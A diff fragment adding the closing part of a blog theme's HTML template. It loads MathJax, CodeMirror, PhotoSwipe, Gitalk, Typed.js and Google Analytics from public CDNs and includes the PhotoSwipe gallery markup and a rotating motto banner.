+    messageStyle: "none"
+  });
+</script>
+<script>
+  function initialMathJax() {
+    MathJax.Hub.Queue(function () {
+      var all = MathJax.Hub.getAllJax(),
+        i;
+      // console.log(all);
+      for (i = 0; i < all.length; i += 1) {
+        console.log(all[i].SourceElement().parentNode)
+        all[i].SourceElement().parentNode.className += ' has-jax';
+      }
+    });
+  }
+
+  function reprocessMathJax() {
+    if (typeof MathJax !== 'undefined') {
+      MathJax.Hub.Queue(["Typeset", MathJax.Hub]);
+    }
+  }
+</script>
+
+
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/gitalk/1.5.0/gitalk.min.css">
+
+    
+<script src="//cdn.bootcss.com/gitalk/1.5.0/gitalk.min.js"></script>
+
+
+
+<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/obsidian.js"></script>
+<script src="/js/jquery.truncate.js"></script>
+<script src="/js/search.js"></script>
+
+
+<script src="//cdn.bootcss.com/typed.js/2.0.10/typed.min.js"></script>
+
+
+<script src="//cdn.bootcss.com/blueimp-md5/2.12.0/js/md5.min.js"></script>
+
+
+<script src="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
+
+
+<script src="https://cdn.bootcss.com/codemirror/5.48.4/codemirror.min.js"></script>
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/javascript/javascript.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/css/css.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/xml/xml.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/htmlmixed/htmlmixed.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/clike/clike.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/php/php.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/shell/shell.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/python/python.min.js"></script>
+
+
+
+
+    
+<script src="/js/busuanzi.min.js"></script>
+
+    <script>
+        $(document).ready(function () {
+            if ($('span[id^="busuanzi_"]').length) {
+                initialBusuanzi();
+            }
+        });
+    </script>
+
+
+
+<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.css">
+<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/default-skin/default-skin.min.css">
+
+
+<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.js"></script>
+<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+    <script async src="//www.googletagmanager.com/gtag/js?id=UA-149874671-1"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+
+        gtag('config', 'UA-149874671-1');
+    </script>
+
+
+
+
+
+<script>
+    function initialTyped () {
+        var typedTextEl = $('.typed-text');
+        if (typedTextEl && typedTextEl.length > 0) {
+            var typed = new Typed('.typed-text', {
+                strings: ["Where there is a will,there is a way！", "有志者，事竟成！"],
+                typeSpeed: 90,
+                loop: true,
+                loopCount: Infinity,
+                backSpeed: 20,
+            });
+        }
+    }
+
+    if ($('.article-header') && $('.article-header').length) {
+        $(document).ready(function () {
+            initialTyped();
+        });
+    }
+</script>
+
+
+
+
+</html>
